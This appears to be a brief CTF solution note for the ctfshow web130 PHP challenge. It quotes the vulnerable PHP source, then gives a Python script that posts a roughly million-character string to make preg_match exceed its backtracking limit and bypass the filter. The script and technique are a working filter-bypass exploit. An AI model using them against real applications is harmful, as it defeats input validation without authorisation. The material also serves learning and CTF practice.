'''
# php_bypass_ctfshow web入门php特性 - 森sen - 博客园 (2023_11_22 21_26_06).html  -- 看web130
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){     //不能匹配到/.+?ctfshow/
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){      //传的$f中有ctfshow
        die('bye!!');
    }

    echo $flag;

} 
'''

# payload1 通过发送超长字符串的方式，使正则执行失败：
import requests
url="http://d982e941-58a2-4bbb-8e2e-298bdb38ac17.challenge.ctf.show/"
data={"f":"1111"*250000+"ctfshow"}
response=requests.post(url=url,data=data)
print(response.text)
